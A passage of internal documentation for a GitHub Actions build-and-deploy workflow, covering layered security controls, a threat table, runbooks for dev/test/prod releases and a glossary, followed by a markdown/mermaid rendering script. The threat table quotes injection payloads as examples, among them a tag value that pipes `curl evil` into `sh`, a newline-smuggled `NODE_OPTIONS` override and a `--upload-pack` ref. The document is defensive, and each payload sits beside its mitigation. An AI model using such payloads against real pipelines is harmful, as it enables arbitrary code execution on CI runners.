3. If you run prod with a tag that test never built, `kubectl apply` still succeeds, but the pods go into **`ImagePullBackOff`**. The workflow does not check that the tag exists (§18 #8).
4. Re-running test with an **existing** tag overwrites that tag in the registry. Use a fresh tag per build (e.g. `R26.11.25`, `R26.11.25.1`).

## 15. Security model

### 15.1 Defence-in-depth layers

```mermaid
flowchart TB
    subgraph L1["Layer 1 · Who can trigger"]
      a1["Repo write access (workflow_dispatch)"]
      a2["DEPLOYERS_GHEC_USER_ID_LIST per env (Vault)"]
    end
    subgraph L2["Layer 2 · What code runs"]
      b1["test/prod only from refs/heads/main"]
      b2["No PR refs, no fully-qualified refs"]
      b3["git check-ref-format"]
      b4["BRANCH override dev-only"]
    end
    subgraph L3["Layer 3 · Input hygiene"]
      c1["Expressions → env: → quoted $VAR"]
      c2["CR/LF stripping before GITHUB_ENV"]
      c3["Allow-lists (case) + regex (require_pattern)"]
      c4["Vault values sanitised too"]
      c5["sed replacement escaping"]
    end
    subgraph L4["Layer 4 · Secrets"]
      d1["OIDC → Vault JWT (no stored passwords)"]
      d2["secrets: masked in logs"]
      d3["persist-credentials: false"]
      d4["BuildKit secrets, not build args"]
    end
    subgraph L5["Layer 5 · Artifact &amp; change control"]
      e1["Xray + Prisma must pass before deploy"]
      e2["Sonar quality scan"]
      e3["ServiceNow approved window for prod"]
      e4["Privileged promote to release"]
    end
    L1 --> L2 --> L3 --> L4 --> L5
```

### 15.2 Threats and how each is handled

| Threat | Example attack | Mitigation in this workflow | Where |
|---|---|---|---|
| **Script injection** | Tag input `x"; curl evil \| sh; "` | Inputs go through `env:` and are used as `"$VAR"`, never pasted into `run:` | Every `run:` step |
| **GITHUB_ENV injection** | Ticket `CHG1\nNODE_OPTIONS=--require=/tmp/x` | Strip `\n\r`, reject `=`, allow-list characters | L75, L126, L222, L269, L285, L308, L396 |
| **Untrusted code with secrets** | Deploy a fork's PR merge ref | PR-ref patterns rejected; test/prod require `main` | L86, L133-138 |
| **Ref / option injection** | Branch `--upload-pack=…` | `git check-ref-format --branch` | L150 |
| **Credential leakage via repo** | Build step reads `.git/config` token | `persist-credentials: false` | L161 |
| **Secrets in image layers** | `ARG NPM_TOKEN` baked into a layer | `docker-build-secrets` + `RUN --mount=type=secret` | L489, UI Dockerfile |
| **Manifest corruption** | Value with `&amp;` or `\|` breaks `sed` | `escape_sed_replacement`, `--` | L547-555 |
| **Unauthorised prod change** | Deploy outside a change window | ServiceNow validation + non-empty ticket | L247, L508 |
| **Vulnerable image** | Base image with critical CVE | Xray + Prisma gates; a failure stops the run before deploy | L477 |
| **Log leakage** | Echo `KUBE_CONFIG` | Listed under `secrets:`, so GitHub masks it | L209-214 |

### 15.3 Script-injection, before and after (for beginners)

```yaml
# ❌ UNSAFE: the value is pasted into the script text before bash runs
- run: echo "Deploying ${{ inputs.DOCKER_IMAGE_TAG }}"

# ✅ SAFE (pattern used in this repo): the value is data in an env var
- env:
    DOCKER_IMAGE_TAG_INPUT: ${{ inputs.DOCKER_IMAGE_TAG }}
  run: echo "Deploying $DOCKER_IMAGE_TAG_INPUT"
```

## 16. Design patterns used

| # | Pattern | Where | How it shows up |
|---|---|---|---|
| 1 | **Reusable workflow / Template Method** | Whole repo | One fixed algorithm (validate → secrets → build → scan → deploy). Callers fill in the variable parts via inputs. |
| 2 | **Thin caller / Facade** | Caller workflows | ~50-line callers hide ~600 lines of pipeline behind six inputs. |
| 3 | **Guard clauses / Fail-fast** | Steps A2-D3, C2 | Cheap checks run **first** and `exit 1`, before any expensive build or risky deploy. |
| 4 | **Allow-list validation** | `case` blocks, `require_pattern` | Accept only known-good values, rather than trying to block known-bad ones. |
| 5 | **Strategy via discriminator** | `BUILD_TYPE`, `ENVIRONMENT` in `if:` | The same job behaves differently based on two string keys (see the matrix in §8.1). |
| 6 | **Build once, deploy many / Immutable artifact** | Test builds, prod reuses tag | Prod deploys the exact bytes that passed test. |
| 7 | **Artifact promotion** | Job 2 | Moves a proven image into the release repository. |
| 8 | **Externalised configuration (12-factor)** | Vault `ci-cd` + per-env paths | Same YAML for all environments; behaviour driven by config. |
| 9 | **Workload identity / Federated credentials** | OIDC → Vault, OIDC → JFrog | No long-lived secrets stored in GitHub. |
| 10 | **Template + placeholder substitution** | `##…##` in `deployment.yaml` | A simple form of Kustomize/Helm templating. |
| 11 | **Sanitise-then-publish (taint tracking)** | `X_INPUT` → `SAFE_X` naming | Raw values are named `*_INPUT`; only `SAFE_*` values are written to `$GITHUB_ENV` and reused. |
| 12 | **Producer → consumer via outputs** | `setoutputs` → `needs.build-deploy.outputs` | Loose coupling between jobs. |
| 13 | **Privilege separation** | Job 2 calls `privileged-workflows` | Release-repo write permission lives in an enterprise-owned workflow, not here. |
| 14 | **Branch-per-variant** *(anti-pattern)* | `main`, `main-uhg-only`, `api-only` | Variants live as long-lived branches instead of inputs, which causes drift (§18 #1). |

## 17. Runbooks: "How do I…?"

### 17.1 Deploy the UI to dev

1. Open **claims-extract-comparison-tool-ui-2-0** → **Actions** → **ORx QEC CECT UI build and deploy**.
2. Click **Run workflow**. Pick your branch in "Use workflow from".
3. ENVIRONMENT `dev`, BUILD_TYPE `NodeJS`, ARTIFACT_TYPE `ui`, DOCKER_IMAGE_TAG e.g. `R26.11.25-mybranch`, leave DOCKER_FILE as is.
4. Watch the run. When it is green, check pods in the dev namespace.

### 17.2 Promote a build to test

1. Merge to `main`.
2. Run the caller from **`main`** with ENVIRONMENT `test` and a **new** tag, e.g. `R26.11.25`.
3. Wait for the email and run regression tests.

### 17.3 Release to prod

1. Raise and get approval for a **ServiceNow change**; note its number (`CHG…`).
2. During the approved window, run the caller from **`main`** with ENVIRONMENT `prod`, the **same tag** that passed test, and `SN_CHANGE_TICKET`.
3. Confirm job 2 (*promote-docker-image-to-release*) also went green.

### 17.4 Add a new value from Vault

1. Add the key in Vault (`kv/data/ci-cd` for shared, `kv/data/&lt;env>` for per-env) in namespace `OPTUM/APP/CECT/STAGE`.
2. Add a line under `values:` (plain) or `secrets:` (masked) at L177-214: `kv/data/ci-cd my-key | MY_VAR ;`.
3. If you will write it to `$GITHUB_ENV` or use it in a path, URL or `sed`, run it through `sanitize_env_value` + `require_pattern` first.
4. Cherry-pick to `main-uhg-only` / `api-only` as needed.

### 17.5 Add a new workflow input

1. Add it under `on.workflow_call.inputs` (L12-45).
2. **Never** use `${{ inputs.NEW }}` inside `run:`. Map it through `env:` and validate it.
3. Add it to each caller's `workflow_dispatch.inputs` and `with:`.

### 17.6 Change memory for the API pods

Edit Vault `kv/data/&lt;env>` keys `k8s-api-memory-limits` / `k8s-api-memory-requests`, then redeploy. No code change is needed. (The UI template hard-codes its resources in `deployment.yaml`.)

### 17.7 Debug a failed run

```mermaid
flowchart TD
    A["Run failed"] --> B{"Message starts with&lt;br/>FATAL ERROR?"}
    B -- yes --> C["Look it up in Appendix C"]
    B -- no --> D{"Which step?"}
    D -->|Vault| E["OIDC / role / namespace / key missing&lt;br/>check caller has id-token: write"]
    D -->|"Configure JFrog / docker login"| F["JFrog OIDC mapping, project key, registry URL"]
    D -->|"Docker Build Scan And Push"| G{"build or scan?"}
    G -->|build| G1["Reproduce docker build locally&lt;br/>npm auth, base image pull"]
    G -->|scan| G2["Xray/Prisma policy violation&lt;br/>upgrade base image / deps"]
    D -->|ServiceNow| H["Ticket not approved or outside window"]
    D -->|kubectl apply| I["kube-config expired? namespace? YAML invalid after sed?"]
    D -->|"Green, but app down"| J["kubectl describe pod:&lt;br/>ImagePullBackOff → tag missing&lt;br/>CreateContainerConfigError → ConfigMap/Secret missing&lt;br/>probe failures → /health-check"]
```

## Glossary

| Term | Meaning |
|---|---|
| **ASK ID / AIDE ID** | UHG application identifier (`UHGWM110-027861`), attached to images and Sonar projects. |
| **BuildKit secret** | A Docker build-time secret mounted for one `RUN` and never stored in a layer. |
| **Caller workflow** | The small workflow in an app repo that `uses:` this reusable workflow. |
| **Central / Edge (JFrog)** | Central = SaaS Artifactory where images are pushed. Edge = UHG-internal replica the clusters pull from. |
| **Change window** | The approved time range on a ServiceNow change during which prod changes are allowed. |
| **EPL** | Enterprise Pipeline Library: UHG's governed GitHub Actions under `uhg-pipelines/`. |
| **Expression** | `${{ … }}`, evaluated by GitHub before the step runs. |
| **GHEC** | GitHub Enterprise Cloud. |
| **`GITHUB_ENV` / `GITHUB_OUTPUT`** | Special files for passing env vars to later steps, and outputs to later jobs. |
| **HPA** | HorizontalPodAutoscaler. |
| **ImagePullBackOff** | K8s pod state when the image cannot be pulled (wrong tag, no credentials). |
| **Namespace (K8s)** | An isolated area inside a cluster, one per CECT environment. |
| **ODI-Gov** | CECT's government (state Medicaid) deployment variant. |
| **OIDC** | OpenID Connect; here, GitHub-issued JWTs used to log in to Vault and JFrog without passwords. |
| **PRM** | UHG privileged-secret manager that holds Prisma credentials. |
| **Promotion** | Copying/moving a tested image into the **release** repository. |
| **Reusable workflow** | A workflow with `on: workflow_call` that other workflows can invoke. |
| **Runner** | Machine that executes jobs; here the self-hosted `uhg-runner`. |
| **Self-hosted runner** | A runner operated by UHG inside its network, not by GitHub. |
| **Sonar quality gate** | Pass/fail thresholds on SonarQube metrics (`targetQG: ADOPTION`). |
| **twistcli** | Prisma Cloud's command-line scanner. |
| **Xray** | JFrog's vulnerability and licence scanner. |

<script src="https://cdn.jsdelivr.net/npm/marked@12.0.2/marked.min.js"></script>
<script type="module">
  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.esm.min.mjs';

  const slug = (t) => t.toLowerCase().replace(/<[^>]+>/g, '').replace(/[^\p{L}\p{N}\s_-]/gu, '').trim().replace(/\s/g, '-');
  const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const tocItems = [];

  marked.use({
    gfm: true,
    renderer: {
      heading(text, level, raw) {
        const id = slug(raw);
        if (level === 2 || level === 3) tocItems.push({ id, level, text: raw });
        return `<h${level} id="${id}">${text}</h${level}>`;
      },
      code(code, lang) {
        if ((lang || '').trim() === 'mermaid') return `<pre class="mermaid">${esc(code)}</pre>`;
        return `<pre><code class="language-${esc(lang || '')}">${esc(code)}</code></pre>`;
      },
    },
  });

  const md = document.getElementById('md-source').value;
  const main = document.getElementById('content');
  main.innerHTML = marked.parse(md);

  // Make relative links to the .md file / html work, open external links in new tab
  main.querySelectorAll('a[href^="http"]').forEach(a => { a.target = '_blank'; a.rel = 'noopener'; });

  const links = document.getElementById('toc-links');
  links.innerHTML = tocItems.map(i => `<a class="h${i.level}" href="#${i.id}">${esc(i.text.replace(/`/g, ''))}</a>`).join('');
  document.getElementById('filter').addEventListener('input', (e) => {
    const q = e.target.value.toLowerCase();
    links.querySelectorAll('a').forEach(a => { a.style.display = a.textContent.toLowerCase().includes(q) ? '' : 'none'; });
  });

  mermaid.initialize({
    startOnLoad: false, securityLevel: 'loose', theme: 'base',
    themeVariables: {
      primaryColor: '#e8f0fe', primaryBorderColor: '#002677', primaryTextColor: '#1f2933',
      lineColor: '#5b6770', secondaryColor: '#fff1ea', tertiaryColor: '#f4f2ec',
      fontFamily: '-apple-system, Segoe UI, Roboto, Arial, sans-serif', fontSize: '14px'
    },
    flowchart: { htmlLabels: true, curve: 'basis' },
    sequence: { mirrorActors: false, showSequenceNumbers: false },
  });

  const nodes = [...document.querySelectorAll('pre.mermaid')];
  window.__mermaidErrors = [];
  for (const [i, el] of nodes.entries()) {
    const code = el.textContent;
    try {
      const { svg } = await mermaid.render(`mmd-${i}`, code);
      el.innerHTML = svg;
    } catch (err) {
      window.__mermaidErrors.push({ index: i, firstLine: code.split('\n')[0], message: String(err.message || err) });
      el.innerHTML = `<div class="mermaid-error">Diagram ${i} failed to render:\n${esc(String(err.message || err))}</div>`;
      document.getElementById(`dmmd-${i}`)?.remove();
    }
  }
  window.__mermaidDone = true;

  const heads = [...main.querySelectorAll('h2[id], h3[id]')];
  const navLinks = new Map([...links.querySelectorAll('a')].map(a => [a.getAttribute('href').slice(1), a]));
  const obs = new IntersectionObserver((entries) => {
    entries.forEach(en => {
      if (en.isIntersecting) {
        navLinks.forEach(a => a.classList.remove('active'));
        navLinks.get(en.target.id)?.classList.add('active');
      }
    });
  }, { rootMargin: '0px 0px -75% 0px' });
  heads.forEach(h => obs.observe(h));
  if (location.hash) document.getElementById(decodeURIComponent(location.hash.slice(1)))?.scrollIntoView();
</script>
